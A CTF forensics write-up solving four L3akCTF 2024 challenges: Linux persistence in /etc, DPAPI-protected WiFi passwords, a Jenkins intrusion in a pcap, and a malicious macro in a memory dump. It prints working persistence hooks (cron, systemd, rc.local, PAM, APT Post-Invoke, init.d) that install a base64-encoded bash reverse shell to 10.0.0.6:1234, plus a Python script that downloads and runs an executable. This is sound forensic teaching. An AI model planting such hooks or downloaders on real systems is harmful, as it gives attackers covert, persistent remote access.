This is a writeup for some forensics challenges from L3akCTF 2024. Not gonna lie, I knew most of the forensics players in L3ak but holy was this CTF was super tough. Shame I had little time to enjoy the CTF due to having a cybercamp right on the CTF day. Well done to the authors for the amazing challenges!

## HoldOnTight [Forensics]
Question: Hacking is all about persistence

Flag: `L3AK{C4n7_570p_w0n7_570p_p3rs1s7}`

We are given a Linux artifact to investigate, specifically the `etc` directory. The challenge mentioned that we should be looking for 8 mini flags related to persistence in Linux systems. Here is a good [reference](https://hadess.io/the-art-of-linux-persistence/) to understand the common methods of Linux persistence.

Welcome to the ultra-realistic Flag Finder Simulation!
A stealthy hacker has compromised this system and deployed 8 cunning persistence mechanisms.
Your mission, should you choose to accept it, involves the /etc directory, a known haven for configuration treachery.
Each mechanism is cleverly referencing /tmp/backdoor.sh – a nefarious script, no doubt.
Alongside each persistence mechanism, a flag is concealed. Secure all 8 to halt the hacker’s scheme.
Report back with each flag as you uncover them. Each mini flag has L3ak{} format.
Remember: After securing the 8 mini flags, the ultimate flag shall unveil itself.
Gear up, remain vigilant, and good luck!

Flags found: 0/8.

Submit a mini flag: 
```

So the first and obvious thing I did was to analyze the `/etc/crontab` file where the 1st flag can be obtained.

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 * * * * root /tm'p/b'ac'kd'oor.sh
#L'3a'k{Cr0n5'_50'_C71'ch3}'
```

Next, I analyzed the services that trigger on boot time located in `/etc/systemd/system`. One of the services called `backdoor.service` obviously represents a backdoor and the 2nd flag can be obtained.

```
[Unit]
Description=Malware Service Example
After=network.target

[Service]
Type=simple
ExecStart=/tmp/backdoor.sh
Restart=on-failure
User=root #}r3m1T_dn@_3c1vr35{ka3L

[Install]
WantedBy=multi-user.target
```

Reading online about Linux persistence, I found out `rc.common/rc.local` was another common location that has IoCs of persistence. Checking out `/etc/rc.local`, a weird bash script can be found. The script seems to be running `/tmp/backdoor.sh` on `10.0.0.6:1234` (these will come in handy later). The 3rd flag can be obtained in the script comments (TDNha3tyY19sMGM0bF8wbl9iMDB0fQ==).

```
#!/bin/bash

ENCODED_ArcaneGate_PATH="L3RtcC9iYWNrZG9vci5zaA=="
ArcaneGate_PATH=$(echo "$ENCODED_ArcaneGate_PATH" | base64 --decode)
ArcaneGate_BASE64='IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC42LzEyMzQgMD4mMQo='

# Check if the ArcaneGate script exists, if not, recreate it from the Base64 string
if [ ! -f "$ArcaneGate_PATH" ]; then
    echo "ArcaneGate script not found, recreating..."
    echo "$ArcaneGate_BASE64" | base64 --decode > "$ArcaneGate_PATH"
    chmod +x "$ArcaneGate_PATH"
fi

# The Specter that Steers Your Spirit
## In the shadowed alcoves of ancient libraries where the whispers of the past linger like morning fog,
## there lies a tome, bound not in leather but in the mysteries of the ether itself.
## The first chapter, "The Specter that Steers Your Spirit," reveals how one may
## summon and commune with the ghostly essences that drift through the veils of our world. 
## TDNha3tyY19sMGM0bF8wbl9iMDB0fQ==

# Execute the ArcaneGate script
"$ArcaneGate_PATH"

exit 0
```

So by grepping `backdoor.sh`, several other IoCs can be found in other directories, specifically at `pam.d`.

```
└─$ grep -r "backdoor.sh" *
pam.d/sudo:session optional pam_exec.so /tmp/backdoor.sh
systemd/system/backdoor.service:ExecStart=/tmp/backdoor.sh
```

Checking out `/etc/pam.d/sudo`, the fourth flag can be obtained.

```
#%PAM-1.0

# Set up user limits from /etc/security/limits.conf.
session    required   pam_limits.so

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0

# CantStopWontStop
session optional pam_exec.so /tmp/backdoor.sh

#L#3#a#k#{#5#u#p#3#r#_#5#h#3#1#1#_#u#5#3#r#}
@include common-auth
@include common-account
@include common-session-noninteractive
```

Another common Linux persistence I remembered was APT Backdooring. So by checking out `/etc/apt/apt.conf.d/`, the fifth flag can be obtained in a file called `100holdon`.

```
#TDNha3s0cDdfSW41NzQxMV81aDMxMX0=
DPKG::Post-Invoke {"file=$(echo 'YmFja2Rvb3Iuc2g='|base64 -d); echo 'IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC42LzEyMzQgMD4mMQo=' |base64 -d > /tmp/$file;chmod +x /tmp/$file;/tmp/$file";};
```

Doing more research online, I stumbled upon this [blog](https://pberba.github.io/security/2022/02/06/linux-threat-hunting-for-persistence-initialization-scripts-and-shell-configuration/) which mentioned boot or logon initialization scripts that could be malicious. Checking the `/etc/init.d/` directory, a script called `stillhere.sh` can be found. The script seems to be running some encrypted payload to an encrypted path.

```
#!/bin/bash
### BEGIN INIT INFO
# Provides:          mysticportal
# Required-Start:    $network
# Required-Stop:

decode_payload() {
    local ENCHANTED=$1
    local i=5
    local payload=""
    while [ $i -lt ${#ENCHANTED} ]; do
        payload="${payload}${ENCHANTED:$i:1}"
        i=$((i+6))
    done
    echo "$payload"
}

# ENCHANTED strings

# Decode the ENCHANTED path and script
MYSTICPORTAL_PATH=$(decode_payload "$ENCHANTED_PATH")
MYSTICPORTAL_SCRIPT=$(decode_payload "$ENCHANTED_STRING")

start() {
    echo "Starting mysticportal service..."
    if [ ! -f "$MYSTICPORTAL_PATH" ]; then
        echo "MYSTICPORTAL script not found, recreating..."
        echo "$MYSTICPORTAL_SCRIPT" > "$MYSTICPORTAL_PATH"
        chmod +x "$MYSTICPORTAL_PATH"
    fi
    # Start the MYSTICPORTAL script or service
    "$MYSTICPORTAL_PATH"
}

stop() {
    echo "Stopping MYSTICPORTAL service..."
    # Code to stop the MYSTICPORTAL service
}

case "$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    *)
        echo "Usage: /etc/init.d/MYSTICPORTAL {start|stop}"
        exit 1
        ;;
esac

exit 0
```

However, the decode function is literally on top of the script so we can just use that to obtain the 6th flag.

```
#!/bin/bash

# Function to interpret message from the other side
decode_payload() {
    local ENCHANTED=$1
    local i=5
    local payload=""
    while [ $i -lt ${#ENCHANTED} ]; do
        payload="${payload}${ENCHANTED:$i:1}"
        i=$((i+6))
    done
    echo "$payload"
}

ENCRYPTED_STRING="sJddrLOwQzD3SwoKPavkMSxkXsAXn{CvzIEiaRxQCnkMjFZiSIjBAtkUwvbdPMZbW_udhQT2inbJn_VLZtRbJPTCm0gsJDF0yUiZi7paJvr5giIKI}DScGa"
DECRYPTED_STRING=$(decode_payload "$ENCRYPTED_STRING")

echo "Decrypted String: $DECRYPTED_STRING"
```

```
└─$ bash script.sh                                 
Decrypted String: L3ak{initd_2_b0075}
```

Running out of ideas, I did a gamer move and grepped the hex values of `L3ak` to find some easy hits. Guess what, it did work LMAO. The 6th and 7th flag was located in `/etc/logrotate.d/rsyslog/` and `/etc/update-motd.d/00-header` respectively.

```
└─$ grep -r "4c33616b" *   
logrotate.d/rsyslog:                # Regular maintenance script version 4c33616b7b3130675f376834375f35683331317d
update-motd.d/00-header:# echo '4c33616b7b35683331315f30665f3768335f4434797d0a' | xxd -r -p
```

With the flags, submit them to the challenge and the real flag can be obtained.

## AiR [Forensics]
Question: Could you help me analyze and find out the WiFi password this person connected to is?

Flag: `L3AK{BL0b_D3crypt1n9_1s_n0_n3w_t0_u_r1ght?}`

We are given triaged artifacts of a drive to investigate. Reading the challenge, it seems that the job was to look for the WiFi password. Researching online about this, I stumbled upon this [post](https://answers.microsoft.com/en-us/windows/forum/all/where-are-the-passwords-of-my-wi-fi-networks-saved/5170ec32-92f9-4187-813f-478e7d6dba76) that mentioned about WiFi being stored under `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces[Interface Guid]`. Checking the folder, the password can be found in the XML file. However, the password seems to be encrypted.

![air1](/assets/posts/l3akctf2024/air1.png)

Researching online about it, I stumbled upon this [post](https://superuser.com/questions/1433261/how-does-windows-7-8-10-store-and-protect-wifi-password) that mentioned that passwords in Windows are encrypted and decrypted with Data Protection API (DPAPI). Reading more about DPAPI, I stumbled upon this [blog](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28) that goes very in-depth in explaining DPAPI, so I will not explain much about it. But basically, a user master key is created and encrypted with user's password, and it is stored in `%APPDATA%/Microsoft/Protect/` while system's master keys are stored in `%WINDIR%/System32/Microsoft/Protect` and used for decrypting DPAPI blobs, protected under a local system account. All the DPAPI blobs created with the CRYPTPROTECT_LOCAL_MACHINE flag set in the CryptProtectData function are protected with the system's Master Keys.

![air4](/assets/posts/l3akctf2024/air4.png)

Hence, we can use [DataProtectionDecryptor](https://www.nirsoft.net/utils/dpapi_data_decryptor.html) from Nirsoft to decrypt DPAPI data stored on external drive by taking the DPAPI blobs in Protect and the specific registry hives (SYSTEM and SECURITY).

![air2](/assets/posts/l3akctf2024/air2.png)

After setting the right configurations and paths, the flag can be obtained.

![air3](/assets/posts/l3akctf2024/air3.png)

## Impostor [Forensics]
Question: We have detected some anomalies in the network traffic. It's very likely that this is the result of an attack that we are unaware of. Could you help us investigate what happened? If this is indeed an attack, what has the attacker obtained?

Flag: `L3AK{J3nk1n$_1s_0n_3dgE_30d84d801b2947f1bd2faae4fdcbb926}`

We are given a `auth.log` file and pcap file to investigate. Analyzing the pcap, the TCP streams show the attacker performing an RCE attack using `jenkins-cli` where he executed several malicious commands to extract credentials. Researching more about this, I stumbled upon this [blog](https://www.jenkins.io/security/advisory/2024-01-24/) that mentioned something about a vulnerability that exploits the @ character. Near the first tcp stream shows several WebSocket packets being sent across as this protocol allows bidirectional, streaming communication over an HTTP(S) port.

![jenkins1](/assets/posts/l3akctf2024/jenkins1.png)

Analyzing the WebSocket streams, we can see the attacker enumerating important files like `/etc/passwd`, `/var/lib/jenkins/secrets/master.key` and `/var/lib/jenkins/credentials.xml`. The last stream shows a part of the flag as `1s_0n_3dg`.

![jenkins2](/assets/posts/l3akctf2024/jenkins2.png)

Ok now to investigate the `auth.log` file which contains logs on user logins and authentication mechanisms. The starting logs show that the attacker was brute forcing to gain access on a Jenkins account with the username `sparkle`.

However, near the end of the logs show that the attacker does gain access to sparkle and downloaded malicious files to the system using Jenkins-CLI. Additionally, it seems that `/var/lib/jenkins/secrets/hudson.util.Secret` was encoded in base64 which might come in useful later.

Going back to the pcap, I extracted the malicious file `data.bin` via HTTP objects. I also managed to find the base64 encoded `hudson.util.Secret` content at TCP stream 55.

![jenkins3](/assets/posts/l3akctf2024/jenkins3.png)

![jenkins4](/assets/posts/l3akctf2024/jenkins4.png)

The `data.bin` file shows a base58 encoded string. Decoding it shows a cron job where the job name was another part of the flag encoded in base64 `E_30d84d801b2947f1bd2faae4fdcbb926}`.

```

Finding the last part of the flag was tough, but going through the TCP and WebSocket streams again, I noticed the `credential.xml` file stores the encrypted user password that might be the flag.

![jenkins5](/assets/posts/l3akctf2024/jenkins5.png)

Doing research on cracking Jenkins passwords, I found this [tool](https://github.com/tarvitz/jenkins-utils) that helps decrypt any Jenkins password as long as a `master key` and `hudson.util.Secret` is supplied. Funnily enough, the `master key` can be easily obtained in a WebSocket stream as the attacker already enumerated for it.

![jenkins6](/assets/posts/l3akctf2024/jenkins6.png)

Remember to decode and download the `hudson.util.Secret` obtained previously.

![jenkins7](/assets/posts/l3akctf2024/jenkins7.png)

Finally, the password can be easily decrypted and the final part of the flag can be obtained as `L3AK{J3nk1n$_`.

## The Spy [Forensics]
Question: During our educational course, one of our students found leaked data, but he does not know how it happened. Are you able to recover what was stolen?

Flag: `L3AK{D1sc0rd_WebH00ks_4re_C001}`

We are given a memory dump to investigate. Reading the scenario, it seems that certain data or files were leaked by a student. Analyzing the proces tree, a suspicious process can be found near the end of the list.

```

```

The process seems to be related to LibreOffice. So by filtering for `.doc` and `.docx` files when analyzing for files, a suspicious doc file can be obtained.

```
└─$ python3 vol.py -f ~/Desktop/sharedfolder/L3akCTF/The\ Spy/memdump.mem -o ~/Desktop windows.filescan | grep -E '\.doc'

0x7fd18ef0      \Users\Abdelrhman\Downloads\Cyber Security and Computer Forensics BSc(Hons) 2021-22.doc 128
```

Bingo! Now to dump the files and analyze it. Since it is a doc file, I suspect that it might be related to Macros. Using oledump, a malicious macro can be analyzed.

Thankfully, the macro was easy to understand. It seems that it was downloading a Python script called `pp.py` from a potential C2 server into `C:\Users\USERNAME\AppData\Local\` and running it.

It also seems that the URL used for downloading the script seems to be encoded in hex and ROT13. So by decoding it, we can proceed to the next step which was to analyze the Python script stored in the Google Drive.

![spy1](/assets/posts/l3akctf2024/spy1.png)

```
import os
import requests

def download_file_from_google_drive(file_id, destination):
    URL = "https://docs.google.com/uc?export=download"

    session = requests.Session()

    response = session.get(URL, params={'id': file_id}, stream=True)
    token = get_confirm_token(response)

    if token:
        params = {'id': file_id, 'confirm': token}
        response = session.get(URL, params=params, stream=True)

    save_response_content(response, destination)

def get_confirm_token(response):
    for key, value in response.cookies.items():
        if key.startswith('download_warning'):
            return value
    return None

def save_response_content(response, destination):
    CHUNK_SIZE = 32768

    with open(destination, "wb") as f:
        for chunk in response.iter_content(CHUNK_SIZE):
            if chunk:
                f.write(chunk)

def hex_to_binary(hex_str):
    return bytes.fromhex(hex_str)

def save_binary_to_file(binary_data, file_path):
    with open(file_path, 'wb') as file:
        file.write(binary_data)

def reverse_hex_conversion(file_path, output_file):
    with open(file_path, 'r') as file:
        hex_content = file.read().strip()
    binary_data = hex_to_binary(hex_content)
    save_binary_to_file(binary_data, output_file)

def run_retrieved_file(file_path):
    os.system(file_path)

if __name__ == "__main__":
    # Download the file and save it as file_hex.txt
    file_id = "1lTEbD37UC7B7tIRoAEQ1YK6niLQHGZt0"
    input_file = "file_hex.txt"
    download_file_from_google_drive(file_id, input_file)
    
    # Convert hex to binary and save it as L3AK.exe
    output_file = "L3AK.exe"  
    reverse_hex_conversion(input_file, output_file)
    
    # Execute the retrieved file
    run_retrieved_file(output_file)
    
    print("File retrieved and executed as L3AK.exe")
```

The Python script seems to download a hex encoded file from Google Drive using the id `1lTEbD37UC7B7tIRoAEQ1YK6niLQHGZt0`. So by editing the URL to the file id, the hex encoded file can be obtained. 

![spy2](/assets/posts/l3akctf2024/spy2.png)

Downloading and decoding it shows that it was a malicious executable.

![spy3](/assets/posts/l3akctf2024/spy3.png)

Analyzing the malware on VirusTotal, it shows that the malware was packed with `PyInstaller`. So by using [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor), the malware can be unpacked.

Dumping the process, I was stuck on this challenge for a long while. However, because the author was a friend of mine, he gave a small nudge to me mentioning that we actually have discussed about this kind of challenge before in another CTF. I was baffled and I straight up remembered about utilizing GIMP to analyze raw data into images. Here is a good [reference](https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html) about this whole thing.

But basically, By dumping the process and renaming the extension from `.dmp` to `.data`, the process can actually be visualized on GIMP as long you have the right width and height (yes its basically trial and error). After several minutes, I managed to get a hit on a part of the MS paint process.

After awhile, I noticed an easy way to determine where the flag might be. If you use `RGB` and look around the starting parts, random colorized pixels can be found when moving the offset. So you can go to any of the colorized pixels and set the appropriate width and height to obtain the flag in cleartext.

By using `RGB565 Big Endian` and width 1624, the flag can be obtained.

PS: Fun fact, I accidentally found a QR code that wasn't even part of the challenge.
